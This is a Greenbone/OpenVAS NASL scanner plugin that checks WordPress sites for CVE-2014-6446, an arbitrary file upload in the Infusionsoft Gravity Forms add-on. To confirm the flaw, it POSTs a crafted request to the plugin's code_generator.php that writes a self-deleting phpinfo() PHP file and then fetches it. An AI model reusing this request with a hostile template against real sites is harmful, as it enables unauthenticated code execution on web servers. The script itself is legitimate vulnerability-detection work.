# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804769");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2014-6446");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-09-29 17:24:16 +0530 (Mon, 29 Sep 2014)");

  script_name("WordPress Infusionsoft Gravity Forms Add-on Arbitrary File Upload Vulnerability");

  script_tag(name:"summary", value:"WordPress Infusionsoft Gravity Forms Add-on is prone to remote file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to upload file or not.");

  script_tag(name:"insight", value:"Flaw is due to the plugin failed to
  restrict access to certain files.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to upload files in an affected site.");

  script_tag(name:"affected", value:"WordPress Infusionsoft Gravity Forms Add-on
  version 1.5.3 to 1.5.10");

  script_tag(name:"solution", value:"Upgrade to version 1.5.11 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://research.g0blin.co.uk/cve-2014-6446");
  script_xref(name:"URL", value:"https://wordpress.org/plugins/infusionsoft/changelog/");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/infusionsoft/Infusionsoft/utilities/code_generator.php";

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

res = http_get_cache(item:url, port:port);

if(">Code Generator<" >< res &&
   "tool will generate a file based on the information you put" >< res) {

  vtstrings = get_vt_strings();
  fileName = vtstrings["lowercase_rand"] + ".php";

  postData = string('fileNamePattern=out%2F', fileName,
                    '&fileTemplate=%3C%3Fphp+phpinfo%28%29%3B+unlink%28+%22',
                    fileName, '%22+%29%3B+%3F%3E');

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n\r\n",
               postData, "\r\n");
  res = http_keepalive_send_recv(port:port, data:req);

  if('Generating Code' >< res && 'Creating File:' >< res) {

    url2 = dir + "/wp-content/plugins/infusionsoft/Infusionsoft/utilities/out/" + fileName;
    if(http_vuln_check(port:port, url:url2, check_header:TRUE,
       pattern:">phpinfo\(\)<", extra_check:">PHP Documentation<")) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
  exit(99);
}

exit(0);
